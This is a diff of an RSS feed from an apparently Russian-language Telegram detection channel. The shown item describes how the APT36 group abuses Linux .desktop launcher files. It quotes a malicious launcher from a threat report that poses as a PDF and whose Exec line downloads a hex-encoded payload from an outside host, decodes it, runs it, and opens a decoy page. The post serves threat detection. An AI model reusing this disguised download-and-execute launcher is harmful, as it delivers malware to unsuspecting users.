@@ -2,7 +2,7 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Detection is easy</title><link>https://t.me/detectioneasy</link><description>Detections</description><language>ru</language><lastBuildDate>Sun, 15 Mar 2026 15:22:20 +0000</lastBuildDate><item><title>Тема с ярлыками остаётся актуальной и для некоторых дистрибутивов Linux. Эту технику использует группировка APT36</title><link>https://t.me/detectioneasy/326</link><description>Всем привет 💻✌️
 Тема с ярлыками остаётся актуальной и для некоторых дистрибутивов Linux. Эту технику использует группировка APT36
 .desktop — это launcher-файл, описанный в Desktop Entry Specification. Он используется desktop-environments для отображения приложений в меню и содержит параметр Exec, определяющий команду запуска.
-Пример файла:
+Пример файла из отчёта:
 [Desktop Entry]
 Name=Meeting_Ltr_ID15430ps.pdf
 Exec=bash -c 'tmp_file="/tmp/Meeting_Ltr_ID15430ps.pdf-$(date +%s)"; curl -s "https://securestore.cv/ghg/Mt_dated_29.txt" | xxd -r -p &gt; "$tmp_file" &amp;&amp; chmod +x "$tmp_file" &amp;&amp; "$tmp_file" &amp; firefox --new-window "https://drive.google.com/file/d/123"'
